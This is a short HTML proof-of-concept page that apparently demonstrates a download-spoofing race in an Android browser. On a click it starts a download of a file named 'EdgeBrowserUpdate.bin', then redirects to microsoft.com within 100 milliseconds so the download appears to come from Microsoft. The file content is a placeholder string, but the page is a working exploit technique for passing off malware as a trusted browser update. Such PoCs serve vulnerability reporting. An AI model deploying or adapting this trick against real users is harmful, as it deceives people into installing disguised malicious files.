<!DOCTYPE html>
<html>
<head>
  <title>Document</title>
</head>
<body>
<h1>Click anywhere</h1>

<script>
document.addEventListener('click', () => {
    // Trigger download dialog Android
    const blob = new Blob(['malicious content'], {type: 'application/octet-stream'});
    const url = URL.createObjectURL(blob);

    const a = document.createElement('a');
    a.href = url;
    a.download = 'EdgeBrowserUpdate.bin';
    a.click();

    // Race: navigate after dialog appears
    setTimeout(() => {
        window.location.href = 'https://microsoft.com';
    }, 100);  // Android needs to be faster because it downloads directly to the notification bar.
});
</script>
</body>
</html>
